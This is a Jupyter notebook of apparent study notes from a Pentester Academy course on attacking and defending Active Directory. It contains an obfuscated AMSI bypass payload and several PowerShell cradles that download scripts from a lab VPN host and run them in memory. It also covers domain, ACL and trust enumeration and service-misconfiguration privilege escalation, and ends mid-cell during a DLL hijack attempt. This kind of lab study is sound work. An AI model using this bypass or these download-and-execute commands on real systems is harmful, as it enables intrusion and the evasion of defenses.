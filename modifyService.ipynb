{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Pentester Academy - Attacking and Defending Active Directory\n",
        " "
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Day 1\n",
        ""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Global Settings"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Prep powershell scripts to be downloaded...\n",
        "$outputDir = \"/home/kali/PTA/AttackDefense/output/\"\n",
        "# $scriptLocation = $outputDir + \"amsibypass.ps1\"\n",
        "# $output = @'\n",
        "#   Code\n",
        "# '@\n",
        "# $output | Out-File -Path $scriptLocation"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Load PowerView into Memory"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Location of Raw PowerView \n",
        "# Download to output location\n",
        "# Execute with a Download Craddle\n",
        "$scriptLocation = $outputDir + \"powerview.ps1\"\n",
        "$urlPowerview = \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\"\n",
        "Invoke-WebRequest -Uri $urlPowerview -OutFile $scriptLocation\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"powerview.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ],
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": ""
          },
          "execution_count": 1,
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Load ActiveDirectory Powershell Module"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "#Loads the dll into memory instead of saving to disk\n",
        "#iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory\n",
        "\n",
        "# Customized for the environment and across the VPN for Pentester Academy\n",
        "#PS > [byte[]] $DLL = Get-Content -Encoding byte -path C:\\ADModule\\Microsoft.ActiveDirectory.Management.dll\n",
        "#PS > [System.IO.File]::WriteAllLines(C:\\ADModule\\dll.txt, ([string]$DLL))\n",
        "#It is always advised to load your own DLL ;)\n",
        "\n",
        "# Saved the above powershell script to my output directory for further work...\n",
        "$scriptLocation = $outputDir + \"ADManagement.ps1\"\n",
        "$urlADModule = \"https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\"\n",
        "Invoke-WebRequest -Uri $urlPowerview -OutFile $scriptLocation\n",
        "\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"ADManagement.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()\n",
        ""
      ],
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": ""
          },
          "execution_count": 1,
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### WinRM Authentication"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Credential Setup \n",
        "# For the WSMan error - https://thomask.sdf.org/blog/2019/12/15/linux-windows-powershell-remoting-troubleshooting.html\n",
        "$pw = ConvertTo-SecureString -AsPlainText -Force -String \"test\"\n",
        "$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"dcorp\\student756\",$pw\n",
        "$s = New-PSSession -ComputerName dcorp-std756 -Authentication Negotiate -Credential $cred\n",
        ""
      ],
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": "\u001B[91mNew-PSSession: \n"
          },
          "execution_count": 1,
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": "\u001B[96mLine |\n"
          },
          "execution_count": 1,
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": "\u001B[96m   5 | \u001B[0m $s = \u001B[96mNew-PSSession -ComputerName dcorp-std756 -Authentication Negotia\u001B[0m …\n"
          },
          "execution_count": 1,
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": "\u001B[96m     | \u001B[91m      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
          },
          "execution_count": 1,
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": "\u001B[91m\u001B[96m     | \u001B[91m[dcorp-std756] An error has occurred which PowerShell cannot handle. A remote session might have ended.\u001B[0m\n"
          },
          "execution_count": 1,
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### AMSI Bypass for the Lab"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# AMSI Bypass for the Lab\n",
        "# Generate a different payload for AMSI bypass https://amsi.fail/\n",
        "# API Direct Connection - https://amsi-fail.azurewebsites.net/api/Generate\n",
        "$scriptLocation = $outputDir + \"amsibypass.ps1\"\n",
        "$output = @'\n",
        "sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( \"1Q2U\"  +\"zX\"  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f'amsi','d','InitFaile'  ),(  \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation -Force\n",
        "\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"amsibypass.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Download Options for Powershell Scripts prior to PSv3"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Download Script - Execute as it is downloaded - Powershell prior to PSv3\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "iex (New-Object Net.WebClient).DownloadString($url)\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Download Script Using COM Objects - Prior to PSv3\n",
        "## Tested but did not work due to smartscreen\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$ie = New-Object -ComObject InternetExplorer.Application\n",
        "$ie.visible=$false\n",
        "$ie.navigate($url)\n",
        "sleep 5\n",
        "$response = $ie.Document.body.innerHTML\n",
        "$ie.quit()\n",
        "iex $response"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Download Options for Powershell Scripts PSv3 Onward"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "## Download Script - PSv3 Onwards\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "iex (iwr $url)"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Download with COM Object\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$h = New-Object -ComObject Msxml2.XMLHTTP\n",
        "$h.open('GET', $url, $false)\n",
        "$h.send()\n",
        "iex $h.responseText"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Download with .NET\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$wr = [System.NET.WebRequest]::Create($url)\n",
        "$r = $wr.GetResponse()\n",
        "iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "$scriptLocation = $outputDir + \"getdomain.ps1\"\n",
        "$output = @'\n",
        "#   Code\n",
        "$ADCLass = [System.DirectoryServices.ActiveDirectory.Domain]\n",
        "$ADClass::GetCurrentDomain()\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Powerview commands\n",
        "# Pull all domains \n",
        "Get-NetDomain\n",
        "\n",
        "# Pull information about a specific domain\n",
        "Get-NetDomain -Domain moneycorp.local\n",
        "\n",
        "# Pull the domainSID for the \n",
        "Get-DomainSID\n",
        "\n",
        "# Pull the domain group policies\n",
        "Get-DomainPolicy\n",
        "\n",
        "# Gather a specific domain policy\n",
        "Get-DomainPolicy -Policy \"Default Domain Policy\"\n",
        "\n",
        "# Gather the policies from a specific domain\n",
        "Get-DomainPolicy -Domain moneycorp.local\n",
        "\n",
        "# Gather the domain controllers in the domain\n",
        "Get-NetDomainController\n",
        "\n",
        "# Gather the domain controllers of another domain\n",
        "Get-NetDomainController -Domain moneycorp.local"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# ADModule commands\n",
        "Get-ADDomain\n",
        "Get-ADDomain -Identity moneycorp.local\n",
        "(Get-ADDomain).DomainSID\n",
        "\n",
        "# View the domain controllers in the domain\n",
        "Get-ADDomainController\n",
        "\n",
        "# View the domain controllers in a specific domain in a forest\n",
        "Get-ADDomainController -DomainName moneycorp.loca -Discover"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADUser Account Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Powerview - User Enumeration\n",
        "Get-NetUser\n",
        "# Filter based on user accounts\n",
        "Get-NetUser | Select cn\n",
        "\n",
        "# Gather information about a specific user\n",
        "Get-NetUser -Username student1\n",
        "\n",
        "# Gather list of all properties for users in the current domain\n",
        "# Below is not working from PowerView - Imported the powerview he had on the box\n",
        "Get-UserProperty -Domain moneycorp.local -Server <servername> -Properties logoncount\n",
        "\n",
        "# Get Last Logged on User\n",
        "Get-NetLoggedon -ComputerName <servername>"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# AD Native commands for User Enumeration\n",
        "Get-ADUser -Filter * -Properties *\n",
        "Get-ADUser -Identity student1 -Properties *\n",
        "\n",
        "# Gather the properties of a given user account\n",
        "Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | select name\n",
        "Get-ADuser -Filter * -Properties * | select name, enabled\n",
        "\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADComputer Account Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Powerview\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# AD Management Module\n",
        "Get-ADComputer -Properties * -Filter *\n",
        "\n",
        "# Filter based on Operating System\n",
        "Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2016*\"' -Properties OperatingSystem "
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADGroup Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# AD Module\n",
        "Get-ADGroup -Filter * | select name\n",
        "\n",
        "# Groups with admin in them\n",
        "Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name\n",
        "\n",
        "# The enterprise admins group is only present in the forest...\n",
        "\n",
        "# Get members of the AD Group\n",
        "Get-ADGroupMember -Identity \"Domain Admins\" -Recursive\n",
        "\n",
        "\n",
        "## Local Groups on a machine can be gathered if administrator privs on non-dc machines\n",
        "# Powerview\n",
        "Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 1\n",
        "````\n",
        "Enumerate the Following\n",
        "Users\n",
        "Computers\n",
        "Domain Administrators\n",
        "Enterprise Administrators *Only works at the top of the forest domain (Flag is the SID of the Enterprise Admin)\n",
        "Shares \n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Get My Current Domain\n",
        "# Load the AD Management Module\n",
        "# Load Powerview into Memory\n",
        "$scriptLocation = $outputDir + \"obj1.ps1\"\n",
        "$output = @'\n",
        "$currentDomainInfo = Get-ADDomain\n",
        "$currentDomain = $currentDomainInfo.DNSRoot\n",
        "$parentDomain = $currentDomainInfo.ParentDomain\n",
        "$childDomainList = $currentDomain.ChildDomains\n",
        "\n",
        "# Domain Controllers of the current domain\n",
        "Get-ADDomainController -DomainName $currentDomain -Discover\n",
        "\n",
        "# Gather users of the current domain\n",
        "Get-ADUser -Filter * -Properties * | select name, SID\n",
        "\n",
        "# Gather computers from current domain\n",
        "Get-ADComputer -Filter * -Properties * | select name, SID\n",
        "\n",
        "# To collect the users from another domain in the forest include the domain under the server paramter\n",
        "# Gather users of the parent domain\n",
        "Get-ADUSer -Filter * -Properties * -Server $parentDomain\n",
        "\n",
        "# Gather the group names from the parent domain\n",
        "Get-ADGroup -Filter * -Properties * -Server $parentDomain\n",
        "\n",
        "# Gather the members of the Enterprise admins from the parent domain\n",
        "Get-ADGroupMember -Identity \"Enterprise Admins\" -Server $parentDomain\n",
        "\n",
        "# Invoke Sharefinder\n",
        "Invoke-ShareFinder \n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "````\n",
        "Output\n",
        "Forest                  : moneycorp.local\n",
        "DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}\n",
        "Children                : {us.dollarcorp.moneycorp.local}\n",
        "DomainMode              : Unknown\n",
        "DomainModeLevel         : 7\n",
        "Parent                  : moneycorp.local\n",
        "PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local\n",
        "RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local\n",
        "InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local\n",
        "Name                    : dollarcorp.moneycorp.local\n",
        "\n",
        "````"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration - GPO\n",
        "````\n",
        "You need to use the Powerview module for Get-NetGPO\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Additional commands to execute\n",
        "# Find shares on domain computers\n",
        "Invoke-ShareFinder\n",
        "\n",
        "# Find files on domain computers\n",
        "Invoke-FileFinder\n",
        "\n",
        "# Get file servers on the domain\n",
        "Get-NetFileServer"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Enumerate GPOs\n",
        "Get-NetGPO"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Enumerate OUs\n",
        "Get-NetOU\n",
        "Get-NetOU | Select Name\n",
        "\n",
        "Get-NetGPO -GPOname \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 2\n",
        "\n",
        "````\n",
        "Enumerate on dollarcorp domain\n",
        "List of all OUs\n",
        "List all the computers in teh StudentMachines OU\n",
        "List the GPOs\n",
        "Enumerate GPO applied on the StudentMachines OU\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "$scriptLocation = $outputDir + \"obj2.ps1\"\n",
        "$output = @'\n",
        "# List all OU's\n",
        "Get-NetOU\n",
        "\n",
        "# List the machines that the OU applies to...\n",
        "Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}\n",
        "\n",
        "# List the GPOs\n",
        "Get-NetGPO\n",
        "\n",
        "\n",
        "# From the output find the gplink for the group policies linked to studentmachines\n",
        "Get-NetOU StudentMachines -FullData\n",
        "\n",
        "# Get the GPO applied to StudentMachines...  More than 1 could exist\n",
        "# Copy the gplink into the ADSPath variable\n",
        "Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration - ACL"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Powerview\n",
        "Get-ObjectAcl -SamAccountName student756 -ResolveGUIDs\n",
        "# ObjectDN is what has access on the account student756\n",
        "\n",
        "# Search using an ADSPrefix\n",
        "Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose\n",
        "\n",
        "# Search using LDAP\n",
        "Get-ObjectAcl -ADSpath \"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -Verbose\n",
        "\n",
        "# Using AD you need to know the CN\n",
        "# for the default administrator account - then for readability send it to a format-list\n",
        "Get-Acl 'AD:\\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' | Format-List\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Search for Interesting ACEs for the current user\n",
        "Invoke-ACLScanner -ResolveGUIDs\n",
        "\n",
        "# Run the ACLScanner for my specific user account\n",
        "Invoke-ACLScanner -ResolveGUIDs -SamAccountName student756"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Path ACLs\n",
        "Get-PathAcl -Path \"\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 3\n",
        "````\n",
        "Enumerate the following for the dollarcorp domain:\n",
        "ACL for the Users Group\n",
        "ACL for teh Domain Admins Group\n",
        "All modify rights/permissions for teh student756\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "#ACL for the Users Group\n",
        "Get-ObjectAcl -SamAccountName student756 -ResolveGUIDs -Verbose\n",
        "\n",
        "# Domain Admins Group\n",
        "Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs -Verbose\n",
        "\n",
        "# Gather the ACLs on the GPOs that Exist\n",
        "get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n",
        "\n",
        "# Enumerate those GPOs where studentx or RDPUsers group have interesting permissions\n",
        "get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match \"rdpusers\"}\n",
        "\n",
        "# Scan with Inovke-ACL Scanners for a specific user\n",
        "Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"student\"}\n",
        "\n",
        "# Specific Group\n",
        "Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"RDPUsers\"}\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 4\n",
        "\n",
        "````\n",
        "Enumerate all domains in the moneycorp.local forest\n",
        "Map the trusts of the dollarcorp.moneycorp.local domain\n",
        "Map External trusts in moneycorp.local forest\n",
        "Identify external trusts of dollarcorp domain.  Can you enumerate trusts for a trusting forest?\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Forest Domain Information\n",
        "Get-NetForestDomain -Verbose\n",
        "\n",
        "# moneycorp.local - Forest\n",
        "# dollarcorp.moneycorp.local - Child\n",
        "# us.dollarcorp.moneycorp.local - Grandchild\n",
        "\n",
        "# Domain Trusts\n",
        "Get-NetDomainTrust\n",
        "# Learn that a bidirectional trust exists between dollarcorp.moneycorp.local and eurocorp.local\n",
        "# eurocorp.local is another forest\n",
        "\n",
        "# Forest Domain Information for eurocorp.local\n",
        "Get-NetForestDomain -Verbose -Forest eurocorp.local | Get-NetDomainTrust\n",
        "# Learn that eurocorp.local has a child domain that is eu.eurocorp.local"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Additional information from Day 1"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Find machines on the current domain where the current user has local admin access\n",
        "Find-LocalAdminAccess -Verbose\n",
        "\n",
        "# Other methods to find local admin access\n",
        "Find-WMILocalAdminAccess.ps1 and Find-PSremotingLocalAdminAccess.ps1\n",
        "\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Privilege Escalation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Find PSRemoting Local Admin Access\n",
        "Find-PSremotingLocalAdminAccess\n",
        "# Returns that the student user has localadminaccess on dcorp-adminsrv\n",
        "\n",
        "# Identify Missing Patches\n",
        "\n",
        "# Automated deployment and Autologon passwords in clear text\n",
        "\n",
        "# Misconfigured Services\n",
        "\n",
        "# DLL Hijacking and more\n",
        "\n",
        "## Tools to use:\n",
        "# PowerUp - Part of PowerShellMafia PowerSploit project\n",
        "# BeRoot by AlessandroZ\n",
        "# Privesc by enjoiz"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Service Misconfiguration (Privilege Escalation)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Find Services that allow for modifying the path to execute a command of choice\n",
        "Get-ServiceUnquoted -Verbose\n",
        "<# Output shows the vulnerabilities and how to exploit...\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "\n",
        "ServiceName    : AbyssWebServer\n",
        "Path           : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiablePath : @{ModifiablePath=C:\\WebServer; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\n",
        "StartName      : LocalSystem\n",
        "AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>\n",
        "CanRestart     : True\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "ServiceName    : AbyssWebServer\n",
        "Path           : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiablePath : @{ModifiablePath=C:\\WebServer; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\n",
        "StartName      : LocalSystem\n",
        "AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>\n",
        "CanRestart     : True\n",
        "\n",
        "#>"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "# Services where the user can write to its binary path or change arguments\n",
        "Get-ModifiableServiceFile -Verbose\n",
        "\n",
        "<#\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "\n",
        "ServiceName                     : AbyssWebServer\n",
        "Path                            : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiableFile                  : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "ModifiableFilePermissions       : AppendData/AddSubdirectory\n",
        "ModifiableFileIdentityReference : BUILTIN\\Users\n",
        "StartName                       : LocalSystem\n",
        "AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'\n",
        "CanRestart                      : True\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "ServiceName                     : AbyssWebServer\n",
        "Path                            : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiableFile                  : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "ModifiableFilePermissions       : WriteData/AddFile\n",
        "ModifiableFileIdentityReference : BUILTIN\\Users\n",
        "StartName                       : LocalSystem\n",
        "AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'\n",
        "CanRestart                      : True\n",
        "#>\n",
        "\n",
        "# Services whose configuration the current user can modify\n",
        "Get-ModifiableService -Verbose\n",
        "\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 5\n",
        "````\n",
        "Exploit a service on dcorp-studentx and elevate privileges to local administrator\n",
        "Identify a machine in the domain where studentx has local administrative access\n",
        "Using privileges of a user on Jenkins on 172.16.3.11:8080 get admin privileges on 172.16.3.11 - the dcorp-ci server\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "Get-PathAcl -Path 'C:\\WebServer\\Abyss Web Server\\WebServer'\n",
        "<# - These do not show in the display of explorer they are special permissions of \"Create files / write data and create folders / append data\"\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : Read\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : AppendData/AddSubdirectory\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : WriteData/AddFile\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "#>\n",
        "\n",
        "# Found a zlib1.dll that I am going to try and hijack\n",
        "# Did not work...\n",
        "# b64 encoded the file to get it to my win10 VisualStudio box\n",
        "$FileName = \"C:\\WebServer\\Abyss Web Server\\WebServer\\zlib1.dll\"\n",
        "$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))\n",
